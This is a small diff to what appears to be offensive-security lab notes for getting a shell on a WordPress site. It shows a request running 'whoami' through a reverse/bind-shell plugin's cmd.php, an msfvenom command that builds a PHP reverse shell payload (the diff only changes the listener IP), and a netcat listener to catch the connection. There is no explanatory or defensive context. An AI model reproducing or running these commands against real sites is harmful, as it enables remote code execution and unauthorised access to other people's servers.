@@ -4,7 +4,7 @@
 http://server.fun/wordpress/wp-content/plugins/wordpress-reverse-bind-shell/cmd.php?cmd=whoami
 
 ## 2nd option
-msfvenom -p php/reverse_php -f raw  LHOST=10.11.0.36 LPORT=4444 -o reverse.php
+msfvenom -p php/reverse_php -f raw  LHOST=172.16.1.1 LPORT=4444 -o reverse.php
 
 nc -lvnp 4444
 
